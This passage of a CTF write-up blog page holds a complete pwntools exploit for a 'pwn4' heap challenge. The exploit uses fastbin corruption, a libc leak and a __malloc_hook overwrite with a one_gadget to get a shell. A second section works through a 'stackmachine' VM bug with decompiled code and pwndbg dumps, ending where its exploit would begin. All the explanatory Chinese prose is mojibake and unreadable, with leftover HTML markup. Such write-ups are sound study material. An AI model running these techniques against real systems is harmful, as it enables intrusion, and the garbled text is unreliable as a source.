class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">c</span>):</span><br><span class="line">p.recvuntil(<span class="string">&quot;choice:&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(c))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">student</span>(<span class="params">sno</span>):</span><br><span class="line">p.recvuntil(<span class="string">&quot;please:&quot;</span>)</span><br><span class="line">p.sendline(sno)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;grade(0~100):&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&quot;grade:&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">host,port=<span class="number">1234</span></span>):</span><br><span class="line"><span class="keyword">global</span> p</span><br><span class="line"><span class="keyword">if</span> host:</span><br><span class="line">    p=remote(host,port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=process(<span class="string">&quot;./pwn4&quot;</span>)</span><br><span class="line">name_addr = <span class="number">0x00000000006032E0</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;name:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;admin&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;word:&quot;</span>)</span><br><span class="line">p.send(<span class="string">&quot;p455w0rd&quot;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x70</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">payload += p64(name_addr+<span class="number">0x10</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;word:&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">student(<span class="string">&quot;aaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;word:&quot;</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)</span><br><span class="line">payload += p64(name_addr-<span class="number">0x5b</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;word:&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">student(<span class="string">&quot;A&quot;</span>*<span class="number">0x60</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;word:&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload += p64(<span class="number">0x0000000000602F38</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">payload = <span class="string">&quot;\x00&quot;</span>*<span class="number">0xb</span>+p64(name_addr+<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">student(payload.ljust(<span class="number">0x60</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;word:&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;STUDENT: &quot;</span>)</span><br><span class="line"></span><br><span class="line">libc.address = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-libc.symbols[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">success(<span class="string">&#x27;libc : &#x27;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line">student(<span class="string">&quot;shabi&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)</span><br><span class="line">payload += p64(name_addr+<span class="number">0x30</span>)*<span class="number">12</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">payload += p64(name_addr+<span class="number">0x10</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;word:&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">student(<span class="string">&quot;shabi&quot;</span>)</span><br><span class="line"></span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;word:&quot;</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)</span><br><span class="line">payload += p64(libc.symbols[<span class="string">&quot;__malloc_hook&quot;</span>]-<span class="number">0x23</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;word:&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">student(p64(name_addr+<span class="number">0x30</span>)*<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;word:&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">one = <span class="number">0xf1207</span>+libc.address</span><br><span class="line">payload = <span class="string">&quot;\x00&quot;</span>*<span class="number">0xb</span>+p64(<span class="number">0</span>)+p64(one)</span><br><span class="line">student(payload.ljust(<span class="number">0x60</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)</span><br><span class="line">payload += p64(name_addr+<span class="number">0x30</span>)*<span class="number">12</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(name_addr) + p64(<span class="number">0</span>)</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;word:&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line">main(args[<span class="string">&#x27;REMOTE&#x27;</span>])</span><br></pre></td></tr></table></figure><p>ruanå¸ˆå‚…nbï¼ï¼</p><h4 id="stackmachine"><a href="#stackmachine" class="headerlink" title="stackmachine"></a>stackmachine</h4><p>ä¸€é“vmç±»å‹çš„é¢˜ç›®ï¼Œé™¤äº†canaryå…¶ä»–ä¿æŠ¤å…¨å¼€ã€‚<br>ç¨‹åºé¦–å…ˆåˆå§‹åŒ–äº†sp,pc,stack,data,codeæ®µï¼Œä¹‹åè¾“å…¥dataå’Œcodeï¼Œç„¶årun(å¸¸è§„çš„VMæ ¼å¼)ã€‚<br>å…ˆæ¥çœ‹ä¸‹åˆå§‹åŒ–çš„æƒ…å†µæŠŠï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20xg 0x1c48000</span><br><span class="line">0x1c48000:0x00000000000000000x0000000000000051</span><br><span class="line">0x1c48010:0x00000000000000000x0000000000000800  //pc &amp; sp</span><br><span class="line">0x1c48020:0x0000000001c480600x0000000000001000  //satck &amp; stack size</span><br><span class="line">0x1c48030:0x0000000001c490700x0000000000001000  //data  &amp; data size</span><br><span class="line">0x1c48040:0x0000000001c4a0800x0000000000001000  //code &amp; code size</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å°±æ˜¯é€†æŒ‡ä»¤äº†ï¼Œæˆ‘åªæŠŠæœ‰ç”¨åˆ°çš„æŒ‡ä»¤ä»£ç æ˜¾ç¤ºäº†å‡ºæ¥ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">      <span class="keyword">if</span> ( vm-&gt;_sp &lt;= (<span class="type">unsigned</span> __int64)(vm-&gt;stack_sz - <span class="number">8</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        *(_QWORD *)(<span class="number">8</span> * ((<span class="type">unsigned</span> __int64)vm-&gt;_sp &gt;&gt; <span class="number">3</span>) + vm-&gt;<span class="built_in">stack</span>) = *(_QWORD *)(<span class="number">8LL</span>* (*(_QWORD *)(vm-&gt;<span class="built_in">stack</span>+<span class="number">8</span> *((<span class="type">unsigned</span> __int64)vm-&gt;_sp &gt;&gt; <span class="number">3</span>)) &gt;&gt; <span class="number">3</span>)+ vm-&gt;data);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_56;</span><br><span class="line">      &#125;</span><br><span class="line">      result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">      <span class="keyword">if</span> ( vm-&gt;_sp &lt;= (<span class="type">unsigned</span> __int64)(vm-&gt;stack_sz - <span class="number">16</span>) )<span class="comment">// stack-&gt;data</span></span><br><span class="line">      &#123;</span><br><span class="line">        *(_QWORD *)(vm-&gt;data + <span class="number">8LL</span> * (*(_QWORD *)(vm-&gt;<span class="built_in">stack</span> + <span class="number">8</span> * ((<span class="type">unsigned</span> __int64)vm-&gt;_sp &gt;&gt; <span class="number">3</span>)) &gt;&gt; <span class="number">3</span>)) = *(_QWORD *)(vm-&gt;<span class="built_in">stack</span> + <span class="number">8</span> * (((<span class="type">unsigned</span> __int64)vm-&gt;_sp &gt;&gt; <span class="number">3</span>) + <span class="number">1</span>));</span><br><span class="line">        vm-&gt;_sp += <span class="number">0x10</span>LL;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_56;</span><br><span class="line">      &#125;</span><br><span class="line">      result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">      <span class="keyword">if</span> ( vm-&gt;_sp &lt;= (<span class="type">unsigned</span> __int64)(vm-&gt;stack_sz - <span class="number">16</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        v2 = *(_QWORD *)(vm-&gt;<span class="built_in">stack</span> + <span class="number">8</span> * ((<span class="type">unsigned</span> __int64)vm-&gt;_sp &gt;&gt; <span class="number">3</span>))</span><br><span class="line">           + *(_QWORD *)(vm-&gt;<span class="built_in">stack</span> + <span class="number">8</span> * (((<span class="type">unsigned</span> __int64)vm-&gt;_sp &gt;&gt; <span class="number">3</span>) + <span class="number">1</span>));</span><br><span class="line">        vm-&gt;_sp += <span class="number">8LL</span>;</span><br><span class="line">        *(_QWORD *)(<span class="number">8</span> * ((<span class="type">unsigned</span> __int64)vm-&gt;_sp &gt;&gt; <span class="number">3</span>) + vm-&gt;<span class="built_in">stack</span>) = v2;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_56;</span><br><span class="line">      &#125;</span><br><span class="line">      result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0xE</span>u:</span><br><span class="line">      <span class="keyword">if</span> ( vm-&gt;_sp &gt; <span class="number">7uLL</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        vm-&gt;_sp -= <span class="number">8LL</span>;</span><br><span class="line">        *(_QWORD *)(<span class="number">8</span> * ((<span class="type">unsigned</span> __int64)vm-&gt;_sp &gt;&gt; <span class="number">3</span>) + vm-&gt;<span class="built_in">stack</span>) = *(_QWORD *)(vm-&gt;code + vm-&gt;_pc + <span class="number">1</span>);</span><br><span class="line">        vm-&gt;_pc += <span class="number">8LL</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_56;</span><br><span class="line">      &#125;</span><br><span class="line">      result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">      <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>è§£é‡Šä¸€ä¸‹<br>0xeï¼šå°†codeæ®µé‡Œæ•°æ®æ”¾å…¥stackæ®µä¸­,pc+&#x3D;8ï¼ˆç›¸å½“äºpushï¼‰ã€‚<br>0x1ï¼šå°†ä»¥dataä¸ºåŸºåœ°å€ä»¥stackä¸ºåç§»çš„åœ°å€çš„å†…å®¹æ”¾å…¥stackä¸­ã€‚<br>0x2ï¼šå°†stacké¡¶çš„æ•°æ®æ”¾å…¥ä»¥dataä¸ºåŸºåœ°å€ï¼Œä»¥stacké¡¶çš„åä¸€ä¸ªçš„æ•°æ®ä¸ºåç§»çš„åœ°å€å¤„ã€‚ï¼ˆç”±äºstackçš„å†…å®¹å¯æ§ï¼Œå› æ­¤å­˜åœ¨è¶Šç•Œå†™ï¼‰ã€‚<br>0x3ï¼šå°†stacké‡Œçš„ä¸¤æ•°ç›¸åŠ å¹¶å­˜å…¥æ ˆé¡¶ã€‚</p><p>è§£ä½“æ€è·¯ï¼š<br>1.é€šè¿‡è§‚å¯Ÿåˆå§‹çš„çŠ¶æ€å¯ä»¥å‘ç°ï¼šdata_ptr&#x3D;0x01c49070,å’Œè¯¥æŒ‡é’ˆå­˜åœ¨çš„ç»“æ„ä½“çš„ä½ç½®ï¼š0x1c48030åç§»ä¸º-0x1040ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å†å¼€å§‹æ—¶å°†stackä¸­å¡«å…¥puts_got+offset(0x10000000000000000-0x1040),ä¹‹åå†æ‰§è¡Œ2æ“ä½œå³å¯ä¿®æ”¹data_pträ¸ºputs_gotã€‚</p><p>2.ç”±äºdata_ptrè¢«ä¿®æ”¹ä¸ºputs_got,å› æ­¤æˆ‘ä»¬åœ¨stacké‡Œæ”¾å…¥1ä½œä¸ºåç§»ï¼Œå†æ‰§è¡Œ1æ“ä½œå³å¯å°†Libcé‡Œçš„åœ°å€å†™å…¥stacké‡Œã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx 0x807000</span><br><span class="line">0x807000:0x00000000000000000x0000000000000051</span><br><span class="line">0x807010:0x000000000000001c0x00000000000007f8</span><br><span class="line">0x807020:0x00000000008070600x0000000000001000</span><br><span class="line">0x807030:0x0000000000601fa00x0000000000001000</span><br><span class="line">0x807040:0x00000000008090800x0000000000001000</span><br><span class="line">0x807050:0x00000000000000000x0000000000001011</span><br><span class="line">0x807060:0x00000000000000000x0000000000000000</span><br><span class="line">0x807070:0x00000000000000000x0000000000000000</span><br><span class="line">0x807080:0x00000000000000000x0000000000000000</span><br><span class="line">0x807090:0x00000000000000000x0000000000000000</span><br><span class="line">pwndbg&gt; telescope 0x0000000000807060+0x7f8</span><br><span class="line">00:0000â”‚ rdx  0x807858 â€”â–¸ 0x7efdc21586a0 (puts) â—‚â€” push   r12</span><br></pre></td></tr></table></figure><p>3.ä¹‹åæˆ‘ä»¬é€šè¿‡+è¿ç®—å°†å…¶æ”¹ä¸ºone_gadgetï¼Œç„¶åå†é€šè¿‡æ­¥éª¤2åœ¨stacké‡Œå†™å…¥ä¸€ä¸ªlibcçš„åœ°å€ï¼Œè¿™ä¸ªåœ°å€å°†ä½œä¸ºåé¢çš„offsetã€‚</p><p>ç”±äºé¢˜ç›®ä¿æŠ¤æ— æ³•æ”¹å†™gotè¡¨ï¼Œruanå¸ˆå‚…æ•™æˆ‘äº†ä¸ªæ–°å§¿åŠ¿ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ DISASM ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">   0x7f118c176b24 &lt;_dl_fini+52&gt;     lea    rcx, [rip + 0x215515] &lt;0x7f118c38c040&gt;</span><br><span class="line">   0x7f118c176b2b &lt;_dl_fini+59&gt;     shl    rax, 4</span><br><span class="line">   0x7f118c176b2f &lt;_dl_fini+63&gt;     lea    r12, [rcx + rax - 0x88]</span><br><span class="line">   0x7f118c176b37 &lt;_dl_fini+71&gt;     jmp    _dl_fini+119 &lt;_dl_fini+119&gt;</span><br><span class="line">    â†“</span><br><span class="line">   0x7f118c176b67 &lt;_dl_fini+119&gt;    lea    rdi, [rip + 0x215dda] &lt;0x7f118c38c948&gt;</span><br><span class="line"> â–º 0x7f118c176b6e &lt;_dl_fini+126&gt;    call   qword ptr [rip + 0x2163d4] &lt;rtld_lock_default_lock_recursive&gt;</span><br><span class="line">        rdi: 0x7f118c38c948 (_rtld_global+2312) â—‚â€” 0x0</span><br><span class="line">        rsi: 0x0</span><br><span class="line">        rdx: 0x7f118c176af0 (_dl_fini) â—‚â€” push   rbp</span><br><span class="line">        rcx: 0x7f118c38c040 (_rtld_global) â€”â–¸ 0x7f118c38d168 â—‚â€” 0x0</span><br><span class="line"></span><br><span class="line">   0x7f118c176b74 &lt;_dl_fini+132&gt;    mov    ecx, dword ptr [r12]</span><br><span class="line">   0x7f118c176b78 &lt;_dl_fini+136&gt;    test   ecx, ecx</span><br><span class="line">   0x7f118c176b7a &lt;_dl_fini+138&gt;    je     _dl_fini+80 &lt;_dl_fini+80&gt;</span><br><span class="line"></span><br><span class="line">   0x7f118c176b7c &lt;_dl_fini+140&gt;    mov    rax, qword ptr [r12 - 8]</span><br><span class="line">   0x7f118c176b81 &lt;_dl_fini+145&gt;    movzx  edx, byte ptr [rax + 0x315]</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">00:0000â”‚ rsp  0x7ffe200d3a80 â€”â–¸ 0x7f118c161620 (_IO_2_1_stdout_) â—‚â€” 0xfbad2887</span><br><span class="line">01:0008â”‚      0x7ffe200d3a88 â—‚â€” 0x1</span><br><span class="line">02:0010â”‚      0x7ffe200d3a90 â€”â–¸ 0x7f118c1616a3 (_IO_2_1_stdout_+131) â—‚â€” 0x162780000000000a /* &#x27;\n&#x27; */</span><br><span class="line">03:0018â”‚      0x7ffe200d3a98 â€”â–¸ 0x7ffe200d3c30 â—‚â€” 0x1</span><br><span class="line">04:0020â”‚      0x7ffe200d3aa0 â—‚â€” 0x0</span><br><span class="line">05:0028â”‚      0x7ffe200d3aa8 â€”â–¸ 0x7f118be16419 (_IO_do_write+121) â—‚â€” mov    r13, rax</span><br><span class="line">06:0030â”‚      0x7ffe200d3ab0 â€”â–¸ 0x7ffe200d3c30 â—‚â€” 0x1</span><br><span class="line">07:0038â”‚      0x7ffe200d3ab8 â€”â–¸ 0x7f118c161620 (_IO_2_1_stdout_) â—‚â€” 0xfbad2887</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ BACKTRACE ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"> â–º f 0     7f118c176b6e _dl_fini+126</span><br><span class="line">   f 1     7f118bdd6008 __run_exit_handlers+232</span><br><span class="line">   f 2     7f118bdd6055</span><br><span class="line">   f 3     7f118bdbc847 __libc_start_main+247</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">pwndbg&gt; telescope 0x7f118c176b74+0x2163d4</span><br><span class="line">00:0000â”‚   0x7f118c38cf48 (_rtld_global+3848) â€”â–¸ 0x7f118c166c90 (rtld_lock_default_lock_recursive) â—‚â€” add    dword ptr [rdi + 4], 1</span><br><span class="line">01:0008â”‚   0x7f118c38cf50 (_rtld_global+3856) â€”â–¸ 0x7f118c166ca0 (rtld_lock_default_unlock_recursive) â—‚â€” sub    dword ptr [rdi + 4], 1</span><br><span class="line">02:0010â”‚   0x7f118c38cf58 (_rtld_global+3864) â€”â–¸ 0x7f118c17a0e0 (_dl_make_stack_executable) â—‚â€” push   rbp</span><br><span class="line">03:0018â”‚   0x7f118c38cf60 (_rtld_global+3872) â—‚â€” 0x6</span><br><span class="line">04:0020â”‚   0x7f118c38cf68 (_rtld_global+3880) â—‚â€” 0x1</span><br><span class="line">05:0028â”‚   0x7f118c38cf70 (_rtld_global+3888) â€”â–¸ 0x7f118c3708f8 â—‚â€” 0x40 /* &#x27;@&#x27; */</span><br></pre></td></tr></table></figure><p>åœ¨æ‰§è¡Œexitå‡½æ•°æ—¶ï¼Œä¸€ç›´æ­¥å…¥è¿›å»çœ‹åˆ°å³å°†callçš„ä½ç½®æ˜¯rtld_lock_default_lock_recursiveï¼š</p><p>0x7f118c38cf48 (_rtld_global+3848) â€”â–¸ 0x7f118c166c90 (rtld_lock_default_lock_recursive)<br>è¿™ç§å’Œgotè¡¨çš„ç»“æ„ç±»ä¼¼ï¼Œå› æ­¤æˆ‘ä»¬åªè¦æ”¹0x7f118c38cf48 (_rtld_global+3848)æŒ‡å‘one_gadgetå³å¯æ‹¿shellï¼Œä½†è¿™ä¸ªåœ°å€æ˜¯lib&#x2F;x86_64-linux-gnu&#x2F;ld-2.23.soé‡Œçš„åœ°å€ï¼Œè™½ç„¶æœ¬åœ°æ˜¯å’ŒlibcåŸºåœ°å€çš„åç§»å›ºå®šï¼Œä½†è¿œç¨‹å¾€å¾€æ˜¯ä¸å›ºå®šçš„ï¼Œç›¸å·®0x1000çš„æ•´æ•°å€ï¼Œå¾—é€šè¿‡çˆ†ç ´è§£å†³ã€‚</p><p>4.æœ¬åœ°æ—¢ç„¶å’Œlibcåç§»å›ºå®šï¼Œå°±ä¼šå’Œlibcé‡Œçš„putsåç§»å›ºå®šï¼Œè€Œ0x0000000000601fa0åˆæ˜¯ä¸€ä¸ªå›ºå®šçš„åœ°å€ï¼Œå› æ­¤åªè¦é€šè¿‡â€™+â€™è¿ç®—æ„é€ åœ°å€ä¸º0x7f118c38cf48 (_rtld_global+3848)-0x0000000000601fa0ï¼Œæœ€åæ‰§è¡Œ2æ“ä½œå³å¯ã€‚</p><p>æ„é€ ç»“æœï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope 0x0000000000e10060+0x7f0</span><br><span class="line">00:0000â”‚   0xe10850 â—‚â€” 0x7f118bd8afa8   //offset</span><br><span class="line">01:0008â”‚   0xe10858 â€”â–¸ 0x7f118be8d207 (exec_comm+2263)  //one_gadget</span><br></pre></td></tr></table></figure><p>expï¼š</p><figure class="highlight 